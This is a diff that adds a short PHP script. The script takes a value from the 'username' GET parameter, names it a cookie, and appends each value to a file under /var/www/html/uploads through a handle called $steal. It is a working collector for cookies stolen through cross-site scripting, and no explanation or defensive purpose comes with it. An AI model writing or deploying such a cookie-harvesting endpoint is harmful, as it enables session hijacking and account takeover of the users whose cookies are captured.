@@ -1,0 +1,6 @@
+ 1 <?php
+  2 $cookie = $_GET["username"];
+  3 $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+  4 fwrite($steal, $cookie ."\n");
+  5 fclose($steal);
+  6 ?>
